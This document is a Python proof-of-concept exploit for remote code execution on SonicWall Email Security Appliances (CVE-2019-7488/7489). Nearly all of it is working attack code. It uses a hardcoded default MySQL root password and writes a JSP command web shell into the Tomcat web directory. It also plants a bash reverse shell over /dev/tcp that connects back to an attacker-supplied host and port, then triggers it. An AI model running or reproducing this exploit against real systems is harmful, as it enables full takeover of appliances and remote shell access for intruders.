#!/usr/bin/env python3
### This script automates unauthenticated remote code execution on Sonicwall Email Security Appliances < 10.0.3 - CVE-2019-7488 and CVE-2019-7489
### You must listen with a netcat listener, and the script will do the rest, it may take a couple seconds to run.
### Vulnerability discovered and POC developed by Nevada Romsdahl
### This should never be used on any system that you do not own or are authorized to test on.

import sys
import subprocess
import requests
import time
import mysql.connector


def forward_ports(target):
    print("[+] Forwarding MySQL and HTTP ports via SSH, ignore the login prompt that will appear")
    subprocess.Popen(f"ssh -L13306:127.0.0.1:3306 snwlcli@{target}", shell=True)
    time.sleep(3)
    subprocess.Popen(f"ssh -L13080:127.0.0.1:80 snwlcli@{target}", shell=True)
    time.sleep(3)


def write_shells(lhost, lport, fname):
    mydb = mysql.connector.connect(
        host="127.0.0.1",
        user="root",
        password="sonic@11",
        port=13306
    )
    mycursor = mydb.cursor()
    print("[+] Writing command shell to the web directory")
    mycursor.execute(
        f'select "<% Runtime.getRuntime().exec(request.getParameter(\\"cmd\\")); %>" into outfile "/opt/tomcat/webapps/SearchEngineRMIService/{fname}.jsp"'
    )
    print("[+] Writing reverse shell to the temp directory")
    mycursor.execute(
        f'select "/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" into outfile "/opt/tomcat/temp/{fname}.sh";')


def execute_shell(fname):
    print("[+] Executing the reverse shell")
    command_url = f'http://127.0.0.1:13080/SearchEngineRMIService/{fname}.jsp?cmd=sh+/opt/tomcat/temp/{fname}.sh'
    r = requests.get(url=command_url)
    print("\n[+] Check your listener, you should have a shell.\n")


def main():
    if len(sys.argv) != 4:
        print(" ")
        print(f"Usage: {sys.argv[0]} <target> <host to connect back to> <port to connect back to>")
        print(f"Example:  {sys.argv[0]} 192.168.2.3 192.168.2.1 4444")
        print("Open a netcat listener before running this script")
        print(" ")
        sys.exit(1)

    target = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
    fname = time.strftime("%Y%m%d-%H%M%S")

    forward_ports(target)
    write_shells(lhost, lport, fname)
    execute_shell(fname)


if __name__ == "__main__":
    main()
